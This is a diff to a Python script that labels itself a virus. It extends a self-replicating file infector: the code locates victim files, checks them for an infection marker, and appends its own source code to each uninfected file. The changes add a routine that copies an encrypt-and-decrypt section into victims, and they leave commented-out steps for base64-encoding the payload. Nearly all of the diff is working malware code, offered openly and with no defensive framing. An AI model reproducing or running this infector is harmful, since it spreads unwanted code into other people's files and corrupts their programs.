@@ -1,13 +1,40 @@
-
 ### -_- VIRUS -_- ###
 import glob,sys,re,base64,json,COVID19Py
+### E & D START ###
+
+
+### E & D  END ###
 
 ### INFECTION VECTOR ###
+
+def getED(): # get encrypt and decrypt part
+    edCode = []
+    fileHandler = open(sys.argv[0],"r")
+    lines = fileHandler.readlines()
+    append = False
+    for line in lines:
+        if(line.startswith("### E & D START ###")):
+            append = True
+        if(append):
+            edCode.append(line)
+        
+        if(line.startswith("### E & D  END ###")):
+            append = False
+    return edCode
 
 def getVirusCode():
     virusCode = []
     fileHandler = open(sys.argv[0],"r")
-    virusCode = fileHandler.read()
+    lines = fileHandler.readlines()
+    append = True
+    for line in lines:
+        if(line.startswith("### E & D START ###")):
+            append = False
+        if(append):
+            virusCode.append(line)
+        
+        if(line.startswith("### E & D  END ###")):
+            append = True
     return virusCode
 
 def find_victims():
@@ -21,8 +48,7 @@ def infectVirus():
             codeLines = fh.readlines()
         with open(victim,"r") as fh:
             programCode = fh.read()
-            
-        #decrypedCode = base64.b64decode(programCode)
+
         infected = False
         for codeLine in codeLines:
             if("### -_- VIRUS -_- ###" in codeLine):
@@ -31,11 +57,14 @@ def infectVirus():
         
         if not infected:
             newCode = []
-            newCode.extend(programCode)
-            #codeBytes = getVirusCode().encode('utf-8')
-            #encodedCode = base64.b64encode(codeBytes)
+            newCode.extend(programCode + "\n")
+
+            #virusCode = getVirusCode()
+            #encryptedVirusCode = base64.b64encode(virusCode.encode("utf-8"))
+
+            #newCode.extend(encryptedVirusCode.decode("utf-8"))
+            newCode.extend(getED())
             newCode.extend(getVirusCode())
-            
             fileHandler = open(victim,"w")
             #fileHandler.write(encodedCode.decode('utf-8'))
             fileHandler.writelines(newCode)
